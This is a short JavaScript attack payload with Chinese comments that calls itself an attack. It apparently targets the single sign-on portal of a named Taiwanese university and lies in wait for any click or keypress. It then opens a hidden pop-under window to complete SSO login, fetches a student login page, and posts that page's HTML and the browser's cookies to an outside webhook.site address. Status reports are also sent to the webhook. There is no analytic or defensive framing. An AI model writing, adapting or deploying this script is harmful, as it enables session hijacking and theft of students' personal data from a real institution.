(async () => {
    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; // 或 index.do

    // 定義攻擊函數
    async function launchAttack() {
        // 1. 移除監聽器 (確保只觸發一次)
        document.removeEventListener('click', launchAttack);
        
        try {
            // 2. 觸發彈窗 (現在是在點擊事件中，Edge 不會擋！)
            // 使用 Pop-under 技巧 (縮小 + 失去焦點)
            const popup = window.open(ssoUrl, "sso_trap", "width=100,height=100,left=9999,top=9999");
            
            if (popup) {
                try { popup.blur(); window.focus(); } catch(e) {} // 嘗試踢到後台
                fetch(webhook + "?step=Popup_Launched_By_Click");
            } else {
                fetch(webhook + "?error=Still_Blocked_WTF");
                return;
            }

            // 3. 等待 SSO 完成
            await new Promise(r => setTimeout(r, 6000));

            // 4. 關閉彈窗
            try { popup.close(); } catch(e) {}

            // 5. 收割資料
            const response = await fetch(targetUrl);
            const html = await response.text();

            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    msg: "Click-Triggered Attack Success",
                    html_content: html.substring(0, 5000), // 內容
                    cookies: document.cookie
                })
            });

        } catch (e) {
            fetch(webhook + "?error=" + encodeURIComponent(e.message));
        }
    }

    // === 埋伏 ===
    // 監聽整個文件的點擊事件
    document.addEventListener('click', launchAttack);
    
    // 如果使用者是透過鍵盤操作，也可以監聽 keydown
    document.addEventListener('keydown', launchAttack);

    // 回報：陷阱已佈署
    fetch(webhook + "?status=Trap_Set_Waiting_For_Click");

})();